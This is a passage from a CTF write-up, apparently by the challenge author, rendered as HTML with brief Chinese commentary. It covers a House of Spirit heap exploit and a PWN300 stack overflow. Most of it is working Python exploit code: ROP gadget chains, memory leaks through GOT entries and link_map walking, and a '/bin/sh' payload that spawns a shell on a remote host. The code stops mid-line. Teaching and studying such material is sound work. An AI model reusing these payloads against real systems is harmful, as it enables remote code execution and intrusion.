comments">#&nbsp;size&nbsp;of&nbsp;next&nbsp;chunk</code></div><div class="line number19 index18 alt2"><code class="python plain">fake&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python string">'A'</code>&nbsp;<code class="python keyword">*</code>&nbsp;<code class="python value">0x8</code></div><div class="line number20 index19 alt1"><code class="python plain">fake&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(</code><code class="python value">0x61</code><code class="python plain">)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;size&nbsp;of&nbsp;free'd&nbsp;chunk</code></div><div class="line number21 index20 alt2"><code class="python plain">fake&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python string">'A'</code>&nbsp;<code class="python keyword">*</code>&nbsp;<code class="python value">0x28</code></div><div class="line number22 index21 alt1"><code class="python plain">fake&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(stack_ptr)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;vuln&nbsp;stack&nbsp;pointer</code></div><div class="line number23 index22 alt2"><code class="python plain">io.rtl(</code><code class="python string">'money~'</code><code class="python plain">)</code></div><div class="line number24 index23 alt1"><code class="python plain">io.w(fake)</code></div><div class="line number25 index24 alt2"><code class="python plain">io.rtl(</code><code class="python string">'choice'</code><code class="python plain">)</code></div><div class="line number26 index25 alt1"><code class="python plain">io.wl(</code><code class="python value">2</code><code class="python plain">)</code></div><div class="line number27 index26 alt2"><code class="python plain">io.rtl(</code><code class="python string">'choice'</code><code class="python plain">)</code></div><div class="line number28 index27 alt1"><code class="python plain">fake&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python string">'A'</code>&nbsp;<code class="python keyword">*</code>&nbsp;<code class="python value">0x38</code></div><div class="line number29 index28 alt2"><code class="python plain">fake&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(</code><code class="python value">0x00400d1b</code><code class="python plain">)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;jmp&nbsp;rsp</code></div><div class="line number30 index29 alt1"><code class="python plain">fake&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python string">'\xeb\x1e\x00\x00'</code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code class="python comments">#&nbsp;short&nbsp;jmp</code></div><div class="line number31 index30 alt2"><code class="python plain">fake&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">fake.ljust(</code><code class="python value">0x10</code><code class="python plain">,&nbsp;</code><code class="python string">'B'</code><code class="python plain">)</code></div><div class="line number32 index31 alt1"><code class="python plain">io.wls([</code><code class="python value">1</code><code class="python plain">,&nbsp;</code><code class="python value">0x50</code><code class="python plain">,&nbsp;fake])</code></div><div class="line number33 index32 alt2"><code class="python plain">io.wl(</code><code class="python value">3</code><code class="python plain">)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;ret&nbsp;to&nbsp;get&nbsp;shell</code></div><div class="line number34 index33 alt1"><code class="python plain">io.itr()</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Reference</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">1. <a href="https://gbmaster.wordpress.com/2015/07/21/x86-exploitation-101-house-of-spirit-friendly-stack-overflow/" _src="https://gbmaster.wordpress.com/2015/07/21/x86-exploitation-101-house-of-spirit-friendly-stack-overflow/">https://gbmaster.wordpress.com/2015/07/21/x86-exploitation-101-house-of-spirit-friendly-stack-overflow/</a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">2. <a href="https://github.com/shellphish/how2heap/blob/master/house_of_spirit.c" _src="https://github.com/shellphish/how2heap/blob/master/house_of_spirit.c">https://github.com/shellphish/how2heap/blob/master/house_of_spirit.c</a></span></p><p style="text-indent: 2em; text-align: left;"><br></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br></span></strong></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">PWN300</span></strong></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Bugs</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">简单粗暴的一个栈溢出</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><strong>Thinking</strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">程序动态链接的两个共享库都是我自己写的，libio.so里用syscall实现了两个输入输出函数，libgetshell.so里放了一个执行shellcode的getshell函数</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">自己设计的思路是根据[[1]](http://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html)这篇文章来的。手动查文件头和各种表寻找共享库内的函数地址。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">关于libgetshell.so的基地址，只要泄露link_map就可以得到</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Exploit</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div><div class="line number48 index47 alt1">48</div><div class="line number49 index48 alt2">49</div><div class="line number50 index49 alt1">50</div><div class="line number51 index50 alt2">51</div><div class="line number52 index51 alt1">52</div><div class="line number53 index52 alt2">53</div><div class="line number54 index53 alt1">54</div><div class="line number55 index54 alt2">55</div><div class="line number56 index55 alt1">56</div><div class="line number57 index56 alt2">57</div><div class="line number58 index57 alt1">58</div><div class="line number59 index58 alt2">59</div><div class="line number60 index59 alt1">60</div><div class="line number61 index60 alt2">61</div><div class="line number62 index61 alt1">62</div><div class="line number63 index62 alt2">63</div><div class="line number64 index63 alt1">64</div><div class="line number65 index64 alt2">65</div><div class="line number66 index65 alt1">66</div><div class="line number67 index66 alt2">67</div><div class="line number68 index67 alt1">68</div><div class="line number69 index68 alt2">69</div><div class="line number70 index69 alt1">70</div><div class="line number71 index70 alt2">71</div><div class="line number72 index71 alt1">72</div><div class="line number73 index72 alt2">73</div><div class="line number74 index73 alt1">74</div><div class="line number75 index74 alt2">75</div><div class="line number76 index75 alt1">76</div><div class="line number77 index76 alt2">77</div><div class="line number78 index77 alt1">78</div><div class="line number79 index78 alt2">79</div><div class="line number80 index79 alt1">80</div><div class="line number81 index80 alt2">81</div><div class="line number82 index81 alt1">82</div><div class="line number83 index82 alt2">83</div><div class="line number84 index83 alt1">84</div><div class="line number85 index84 alt2">85</div><div class="line number86 index85 alt1">86</div><div class="line number87 index86 alt2">87</div><div class="line number88 index87 alt1">88</div><div class="line number89 index88 alt2">89</div><div class="line number90 index89 alt1">90</div><div class="line number91 index90 alt2">91</div><div class="line number92 index91 alt1">92</div><div class="line number93 index92 alt2">93</div><div class="line number94 index93 alt1">94</div><div class="line number95 index94 alt2">95</div><div class="line number96 index95 alt1">96</div><div class="line number97 index96 alt2">97</div><div class="line number98 index97 alt1">98</div><div class="line number99 index98 alt2">99</div><div class="line number100 index99 alt1">100</div><div class="line number101 index100 alt2">101</div><div class="line number102 index101 alt1">102</div><div class="line number103 index102 alt2">103</div><div class="line number104 index103 alt1">104</div><div class="line number105 index104 alt2">105</div><div class="line number106 index105 alt1">106</div><div class="line number107 index106 alt2">107</div><div class="line number108 index107 alt1">108</div><div class="line number109 index108 alt2">109</div><div class="line number110 index109 alt1">110</div><div class="line number111 index110 alt2">111</div><div class="line number112 index111 alt1">112</div><div class="line number113 index112 alt2">113</div><div class="line number114 index113 alt1">114</div><div class="line number115 index114 alt2">115</div><div class="line number116 index115 alt1">116</div><div class="line number117 index116 alt2">117</div><div class="line number118 index117 alt1">118</div><div class="line number119 index118 alt2">119</div><div class="line number120 index119 alt1">120</div><div class="line number121 index120 alt2">121</div><div class="line number122 index121 alt1">122</div><div class="line number123 index122 alt2">123</div><div class="line number124 index123 alt1">124</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python keyword">from</code>&nbsp;<code class="python plain">zio&nbsp;</code><code class="python keyword">import</code>&nbsp;<code class="python keyword">*</code></div><div class="line number2 index1 alt1"><code class="python plain">io&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">zio((</code><code class="python string">'119.28.63.211'</code><code class="python plain">,&nbsp;</code><code class="python value">2339</code><code class="python plain">),&nbsp;print_read&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">COLORED(</code><code class="python functions">REPR</code><code class="python plain">,&nbsp;</code><code class="python string">'red'</code><code class="python plain">),&nbsp;print_write&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">COLORED(</code><code class="python functions">REPR</code><code class="python plain">,&nbsp;</code><code class="python string">'blue'</code><code class="python plain">),&nbsp;timeout&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">100000</code><code class="python plain">)</code></div><div class="line number3 index2 alt2"><code class="python plain">io.hint([</code><code class="python value">0x4004cb</code><code class="python plain">])</code></div><div class="line number4 index3 alt1"><code class="python plain">got_write&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x601018</code></div><div class="line number5 index4 alt2"><code class="python plain">got_read&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x601020</code></div><div class="line number6 index5 alt1"><code class="python plain">adr_bss&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x601000</code></div><div class="line number7 index6 alt2"><code class="python keyword">def</code>&nbsp;<code class="python plain">com_gadget(part1,&nbsp;part2,&nbsp;jmp2,&nbsp;arg1&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x0</code><code class="python plain">,&nbsp;arg2&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x0</code><code class="python plain">,&nbsp;arg3&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x0</code><code class="python plain">):</code></div><div class="line number8 index7 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(part1)&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;part1&nbsp;entry&nbsp;pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret</code></div><div class="line number9 index8 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(</code><code class="python value">0x0</code><code class="python plain">)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;rbx&nbsp;be&nbsp;0x0</code></div><div class="line number10 index9 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(</code><code class="python value">0x1</code><code class="python plain">)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;rbp&nbsp;be&nbsp;0x1</code></div><div class="line number11 index10 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(jmp2)&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;r12&nbsp;jump&nbsp;to</code></div><div class="line number12 index11 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(arg3)&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;r13&nbsp;-&gt;&nbsp;rdx&nbsp;&nbsp;&nbsp;&nbsp;arg3</code></div><div class="line number13 index12 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(arg2)&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;r14&nbsp;-&gt;&nbsp;rsi&nbsp;&nbsp;&nbsp;&nbsp;arg2</code></div><div class="line number14 index13 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(arg1)&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;r15&nbsp;-&gt;&nbsp;edi&nbsp;&nbsp;&nbsp;&nbsp;arg1</code></div><div class="line number15 index14 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(part2)&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;part2&nbsp;entry&nbsp;will&nbsp;call&nbsp;[rbx&nbsp;+&nbsp;r12&nbsp;+&nbsp;0x8]</code></div><div class="line number16 index15 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python string">'A'</code>&nbsp;<code class="python keyword">*</code>&nbsp;<code class="python value">48</code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code class="python comments">#&nbsp;junk</code></div><div class="line number17 index16 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code>&nbsp;<code class="python plain">payload</code></div><div class="line number18 index17 alt1"><code class="python keyword">def</code>&nbsp;<code class="python plain">leak(address,&nbsp;size):</code></div><div class="line number19 index18 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python string">'A'</code>&nbsp;<code class="python keyword">*</code>&nbsp;<code class="python value">0x28</code></div><div class="line number20 index19 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">com_gadget(</code><code class="python value">0x40049c</code><code class="python plain">,&nbsp;</code><code class="python value">0x400480</code><code class="python plain">,&nbsp;jmp2&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">got_write,</code></div><div class="line number21 index20 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">arg1&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x1</code><code class="python plain">,</code></div><div class="line number22 index21 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">arg2&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">address,</code></div><div class="line number23 index22 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">arg3&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">size)</code></div><div class="line number24 index23 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(</code><code class="python value">0x4004ec</code><code class="python plain">)&nbsp;</code><code class="python comments">#&nbsp;program&nbsp;entry</code></div><div class="line number25 index24 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">io.rl()</code></div><div class="line number26 index25 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">io.w(payload)</code></div><div class="line number27 index26 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">leak_data&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">io.r(size)</code></div><div class="line number28 index27 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">print</code>&nbsp;<code class="python string">'{}&nbsp;==&gt;&nbsp;{}'</code><code class="python plain">.</code><code class="python functions">format</code><code class="python plain">(</code><code class="python functions">hex</code><code class="python plain">(address),&nbsp;leak_data.encode(</code><code class="python string">'hex'</code><code class="python plain">))</code></div><div class="line number29 index28 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code>&nbsp;<code class="python plain">leak_data</code></div><div class="line number30 index29 alt1"><code class="python keyword">def</code>&nbsp;<code class="python plain">getshell(adr_system):</code></div><div class="line number31 index30 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">raw_input</code><code class="python plain">()</code></div><div class="line number32 index31 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python string">'A'</code>&nbsp;<code class="python keyword">*</code>&nbsp;<code class="python value">0x28</code></div><div class="line number33 index32 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">com_gadget(</code><code class="python value">0x40049c</code><code class="python plain">,&nbsp;</code><code class="python value">0x400480</code><code class="python plain">,&nbsp;jmp2&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">got_read,</code></div><div class="line number34 index33 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">arg1&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x0</code><code class="python plain">,</code></div><div class="line number35 index34 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">arg2&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">adr_bss&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python value">0x80</code><code class="python plain">,</code></div><div class="line number36 index35 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">arg3&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x10</code><code class="python plain">)</code></div><div class="line number37 index36 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(</code><code class="python value">0x4004ec</code><code class="python plain">)&nbsp;</code><code class="python comments">#&nbsp;program&nbsp;entry</code></div><div class="line number38 index37 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">io.w(payload)</code></div><div class="line number39 index38 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">io.w(</code><code class="python string">'/bin/sh\x00'</code>&nbsp;<code class="python keyword">+</code>&nbsp;<code class="python plain">l64(adr_system))</code></div><div class="line number40 index39 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python string">'A'</code>&nbsp;<code class="python keyword">*</code>&nbsp;<code class="python value">0x28</code></div><div class="line number41 index40 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">com_gadget(</code><code class="python value">0x40049c</code><code class="python plain">,&nbsp;</code><code class="python value">0x400480</code><code class="python plain">,&nbsp;jmp2&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">adr_bss&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python value">0x88</code><code class="python plain">,</code></div><div class="line number42 index41 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">arg1&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">adr_bss&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python value">0x80</code><code class="python plain">)</code></div><div class="line number43 index42 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(</code><code class="python value">0xdeadbeef</code><code class="python plain">)</code></div><div class="line number44 index43 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">io.w(payload.ljust(</code><code class="python value">0x80</code><code class="python plain">,&nbsp;</code><code class="python string">'A'</code><code class="python plain">))</code></div><div class="line number45 index44 alt2"><code class="python comments">#&nbsp;manual&nbsp;leak&nbsp;libc</code></div><div class="line number46 index45 alt1"><code class="python plain">BITS&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">64</code></div><div class="line number47 index46 alt2"><code class="python keyword">def</code>&nbsp;<code class="python plain">find_elf_base():</code></div><div class="line number48 index47 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">adr_lmap&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x601008</code></div><div class="line number49 index48 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">node&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(leak(adr_lmap,&nbsp;</code><code class="python value">8</code><code class="python plain">))</code></div><div class="line number50 index49 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">name&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x0</code></div><div class="line number51 index50 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">junk&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">''</code></div><div class="line number52 index51 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">while</code>&nbsp;<code class="python color1">True</code><code class="python plain">:</code></div><div class="line number53 index52 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code>&nbsp;<code class="python plain">node:</code></div><div class="line number54 index53 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">junk&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">leak(node,&nbsp;</code><code class="python value">8</code><code class="python keyword">*</code><code class="python value">5</code><code class="python plain">)</code></div><div class="line number55 index54 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code>&nbsp;<code class="python string">'getshell'</code>&nbsp;<code class="python keyword">in</code>&nbsp;<code class="python plain">leak(l64(junk[</code><code class="python value">8</code><code class="python plain">:</code><code class="python value">16</code><code class="python plain">]),&nbsp;</code><code class="python value">0x80</code><code class="python plain">):</code></div><div class="line number56 index55 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">print</code>&nbsp;<code class="python string">'[+]&nbsp;find&nbsp;shared&nbsp;object&nbsp;at&nbsp;0x%x&nbsp;~'</code>&nbsp;<code class="python keyword">%</code>&nbsp;<code class="python plain">l64(junk[:</code><code class="python value">8</code><code class="python plain">])</code></div><div class="line number57 index56 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">break</code></div><div class="line number58 index57 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">else</code>&nbsp;<code class="python plain">:</code></div><div class="line number59 index58 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">node&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(junk[</code><code class="python value">24</code><code class="python plain">:</code><code class="python value">32</code><code class="python plain">])</code></div><div class="line number60 index59 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">else</code><code class="python plain">:</code></div><div class="line number61 index60 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">print</code>&nbsp;<code class="python string">'[-]&nbsp;not&nbsp;found&nbsp;~'</code></div><div class="line number62 index61 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">break</code></div><div class="line number63 index62 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code>&nbsp;<code class="python plain">l64(junk[:</code><code 